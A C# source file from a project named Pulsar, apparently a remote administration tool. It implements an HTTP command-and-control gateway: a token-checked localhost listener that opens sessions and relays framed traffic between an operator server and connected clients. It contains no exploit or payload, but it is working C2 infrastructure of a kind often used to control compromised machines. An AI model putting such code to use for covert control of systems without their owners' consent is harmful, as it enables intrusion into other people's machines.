using System;
using Pulsar.Common.Cryptography;
using Pulsar.Common.Models;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Pulsar.Server.Models;

namespace Pulsar.Server.Networking
{
    internal sealed class HttpC2Gateway : IDisposable
    {
        private readonly HttpListener _listener = new HttpListener();
        private readonly ConcurrentDictionary<string, (HttpC2ServerStream Stream, Client Client)> _sessions = new ConcurrentDictionary<string, (HttpC2ServerStream, Client)>();
        private readonly ConcurrentDictionary<string, DateTime> _sessionActivity = new ConcurrentDictionary<string, DateTime>();
        private readonly Server _server;
        private readonly CancellationTokenSource _cts = new CancellationTokenSource();
        private readonly int _port;
        private readonly HttpC2Paths _paths;
        private readonly byte[] _authTokenBytes;
        private bool _disposed;

        public int Port => _port;

        public bool IsListening => _listener.IsListening;

        private const int FrameHeaderSize = 4;
        private const int MaxFramePayload = 256 * 1024;
        private const int MaxRequestBytes = MaxFramePayload + FrameHeaderSize;
        private const int MaxSessions = 50;
        private static readonly TimeSpan SessionIdleTimeout = TimeSpan.FromMinutes(5);

        public HttpC2Gateway(Server server, HttpC2Paths paths, string authToken, int port = 8080)
        {
            _server = server ?? throw new ArgumentNullException(nameof(server));
            _port = port;
            _paths = HttpC2PathValidator.Sanitize(paths, out _);
            var trimmedToken = (authToken ?? string.Empty).Trim();
            if (!Settings.IsHttpC2TokenStrong(trimmedToken))
            {
                throw new ArgumentException("HTTP C2 token must be at least 32 characters and use a safe character set.", nameof(authToken));
            }

            _authTokenBytes = Encoding.UTF8.GetBytes(trimmedToken);
        }

        public void Start()
        {
            if (_disposed)
            {
                throw new ObjectDisposedException(nameof(HttpC2Gateway));
            }

            if (_listener.IsListening)
            {
                return;
            }

            var prefix = $"http://127.0.0.1:{_port}/";
            _listener.Prefixes.Clear();
            _listener.Prefixes.Add(prefix);
            _listener.Start();

            _ = Task.Run(ListenAsync, _cts.Token);
            _ = Task.Run(CleanupSessionsAsync, _cts.Token);
        }

        public void Stop()
        {
            if (!_listener.IsListening)
            {
                return;
            }

            _cts.Cancel();
            _listener.Stop();
        }

        public void Dispose()
        {
            if (_disposed)
            {
                return;
            }

            _disposed = true;
            Stop();

            foreach (var session in _sessions.Values)
            {
                session.Client?.Disconnect();
                session.Stream?.Dispose();
            }

            _listener.Close();
            _cts.Dispose();
        }

        private async Task ListenAsync()
        {
            while (!_cts.IsCancellationRequested)
            {
                HttpListenerContext context = null;
                try
                {
                    context = await _listener.GetContextAsync();
                    _ = Task.Run(() => HandleContextAsync(context), _cts.Token);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch
                {
                    await Task.Delay(500, _cts.Token).ConfigureAwait(false);
                }
            }
        }

        private async Task HandleContextAsync(HttpListenerContext context)
        {
            var request = context.Request;
            var response = context.Response;

            try
            {
                if (!IsAuthorized(request))
                {
                    response.StatusCode = 401;
                    return;
                }

                var path = request.Url.AbsolutePath ?? string.Empty;

                if (string.Equals(path, _paths.Open, StringComparison.OrdinalIgnoreCase))
                {
                    await HandleOpenAsync(response).ConfigureAwait(false);
                }
                else if (string.Equals(path, _paths.Up, StringComparison.OrdinalIgnoreCase))
                {
                    await HandleUpAsync(request, response).ConfigureAwait(false);
                }
                else if (string.Equals(path, _paths.Down, StringComparison.OrdinalIgnoreCase))
                {
                    await HandleDownAsync(request, response).ConfigureAwait(false);
                }
                else if (string.Equals(path, _paths.Close, StringComparison.OrdinalIgnoreCase))
                {
                    await HandleCloseAsync(request, response).ConfigureAwait(false);
                }
                else
                {
                    response.StatusCode = 404;
                }
            }
            catch
            {
                response.StatusCode = 500;
            }
            finally
            {
                response.OutputStream.Close();
            }
        }

        private async Task HandleOpenAsync(HttpListenerResponse response)
        {
            if (_sessions.Count >= MaxSessions)
            {
                response.StatusCode = 503;
                return;
            }

            var sessionId = Guid.NewGuid().ToString("N");
            var stream = new HttpC2ServerStream(new IPEndPoint(IPAddress.Loopback, 0));
            var client = _server.AttachExternalStream(stream, stream.RemoteEndPoint);

            _sessions[sessionId] = (stream, client);
            _sessionActivity[sessionId] = DateTime.UtcNow;

            var payload = Encoding.UTF8.GetBytes(sessionId);
            response.StatusCode = 200;
            response.ContentType = "text/plain";
            await response.OutputStream.WriteAsync(payload, 0, payload.Length).ConfigureAwait(false);
        }

        private async Task HandleUpAsync(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (!TryGetSession(request, out var session))
            {
                response.StatusCode = 404;
                return;
            }

            if (request.ContentLength64 > MaxRequestBytes)
            {
                response.StatusCode = 413;
                return;
            }

            using (var ms = new MemoryStream())
            {
                await request.InputStream.CopyToAsync(ms).ConfigureAwait(false);
                var payload = ms.ToArray();
                if (payload.Length > 0)
                {
                    session.Stream.EnqueueFramedIncoming(payload, 0, payload.Length);
                }
            }

            UpdateSessionActivity(request);
            response.StatusCode = 200;
        }

        private async Task HandleDownAsync(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (!TryGetSession(request, out var session))
            {
                response.StatusCode = 404;
                return;
            }

            var data = session.Stream.DequeueOutgoing(30000, 1024 * 1024);
            if (data.Length > 0)
            {
                response.StatusCode = 200;
                response.ContentType = "application/octet-stream";
                await response.OutputStream.WriteAsync(data, 0, data.Length).ConfigureAwait(false);
            }
            else
            {
                response.StatusCode = 200;
            }

            UpdateSessionActivity(request);
        }

        private async Task HandleCloseAsync(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (TryGetSession(request, out var session))
            {
                session.Client?.Disconnect();
                session.Stream?.Dispose();
                _sessions.TryRemove(GetSessionId(request), out _);
                _sessionActivity.TryRemove(GetSessionId(request), out _);
            }

            response.StatusCode = 200;
            await response.OutputStream.FlushAsync().ConfigureAwait(false);
        }

        private bool TryGetSession(HttpListenerRequest request, out (HttpC2ServerStream Stream, Client Client) session)
        {
            var sessionId = GetSessionId(request);
            return _sessions.TryGetValue(sessionId, out session);
        }

        private static string GetSessionId(HttpListenerRequest request)
        {
            return request.QueryString["sid"] ?? string.Empty;
        }

        private void UpdateSessionActivity(HttpListenerRequest request)
        {
            var sessionId = GetSessionId(request);
            if (!string.IsNullOrEmpty(sessionId))
            {
                _sessionActivity[sessionId] = DateTime.UtcNow;
            }
        }

        private bool IsAuthorized(HttpListenerRequest request)
        {
            if (_authTokenBytes.Length == 0)
            {
                return false;
            }

            var headerValue = request.Headers["X-Pulsar-Token"];
            if (string.IsNullOrWhiteSpace(headerValue))
            {
                return false;
            }

            var incomingBytes = Encoding.UTF8.GetBytes(headerValue.Trim());
            if (incomingBytes.Length != _authTokenBytes.Length)
            {
                return false;
            }

            return SafeComparison.AreEqual(incomingBytes, _authTokenBytes);
        }

        private async Task CleanupSessionsAsync()
        {
            while (!_cts.IsCancellationRequested)
            {
                try
                {
                    var cutoff = DateTime.UtcNow - SessionIdleTimeout;
                    foreach (var entry in _sessionActivity)
                    {
                        if (entry.Value < cutoff)
                        {
                            if (_sessions.TryRemove(entry.Key, out var session))
                            {
                                session.Client?.Disconnect();
                                session.Stream?.Dispose();
                            }

                            _sessionActivity.TryRemove(entry.Key, out _);
                        }
                    }
                }
                catch
                {
                }

                try
                {
                    await Task.Delay(TimeSpan.FromSeconds(30), _cts.Token).ConfigureAwait(false);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
            }
        }
    }
}
